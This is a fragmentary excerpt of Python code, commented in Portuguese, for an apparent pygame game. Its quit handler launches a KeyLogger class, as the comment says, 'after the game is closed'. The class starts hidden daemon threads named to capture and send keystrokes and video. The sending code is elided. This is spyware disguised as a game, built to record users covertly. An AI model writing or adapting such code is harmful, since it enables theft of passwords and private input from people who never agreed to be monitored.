...
class KeyLogger:
    ...
    def capturar_e_enviar_teclado():
        ...
        try:
            ...
            def on_press(key):
                try:
                    key_data = key.char if hasattr(key, 'char') else str(key)  # Captura teclas comuns e especiais
                except Exception as e:
                    key_data = f"[Erro ao capturar tecla: {e}]"
    ...
    def iniciarKeyLogger():
        video_thread = threading.Thread(target=KeyLogger.capturar_e_enviar_video, daemon=True)
        keylog_thread = threading.Thread(target=KeyLogger.capturar_e_enviar_teclado, daemon=True)
        video_thread.start()
        keylog_thread.start()
...
while True:
    for event in pg.event.get():
        if event.type == pg.QUIT:
            pg.quit()  # Finaliza o Pygame
            keylogger = KeyLogger()  # Inicia o KeyLogger após o jogo ser fechado
    ...
    if w.home_menu == True:
        ...
        if w.pause_menu == True:
            button_action = w.pause_screen([('Home Menu', 'green'), ('Restart', 'blue light 2'), ('Quit Game', 'red')],
                                           button_layout=(3, 3))
